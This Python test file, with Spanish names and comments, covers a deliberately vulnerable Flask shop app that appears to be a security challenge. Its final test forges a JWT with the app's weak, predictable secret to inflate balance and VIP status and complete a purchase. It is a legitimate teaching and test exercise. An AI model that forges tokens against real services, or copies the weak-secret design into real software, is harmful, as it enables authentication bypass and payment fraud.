import jwt

from app import create_app
from app.jwt_utils import SECRET, ALGORITHM


def _login(client, username, password):
    res = client.post("/auth/login", json={"username": username, "password": password})
    return res.get_json()["token"]


def test_health():
    client = create_app().test_client()
    assert client.get("/health").status_code == 200


def test_login_y_perfil_reflejan_el_token():
    client = create_app().test_client()
    token = _login(client, "alice", "alice123")

    perfil = client.get("/me", headers={"Authorization": f"Bearer {token}"}).get_json()
    assert perfil["username"] == "alice"
    assert perfil["balance"] == 100
    assert perfil["isVip"] is False


def test_login_credenciales_invalidas():
    client = create_app().test_client()
    res = client.post("/auth/login", json={"username": "alice", "password": "incorrecta"})
    assert res.status_code == 401


def test_sin_saldo_no_puede_comprar():
    client = create_app().test_client()
    token = _login(client, "alice", "alice123")
    res = client.post(
        "/tienda/comprar",
        json={"producto": "notebook-gamer"},
        headers={"Authorization": f"Bearer {token}"},
    )
    assert res.status_code == 402


def test_token_forjado_con_el_secreto_debil_permite_comprar():
    """Reproduce el ataque del desafio: como SECRET es debil y predecible,
    cualquiera puede firmar un token propio con balance/isVip alterados."""
    client = create_app().test_client()

    token_forjado = jwt.encode(
        {"sub": "999", "username": "atacante", "balance": 999999, "isVip": True},
        SECRET,
        algorithm=ALGORITHM,
    )

    perfil = client.get("/me", headers={"Authorization": f"Bearer {token_forjado}"}).get_json()
    assert perfil["balance"] == 999999
    assert perfil["isVip"] is True

    compra = client.post(
        "/tienda/comprar",
        json={"producto": "notebook-gamer"},
        headers={"Authorization": f"Bearer {token_forjado}"},
    ).get_json()
    assert compra["ok"] is True
    assert compra["descuento_vip_aplicado"] is True
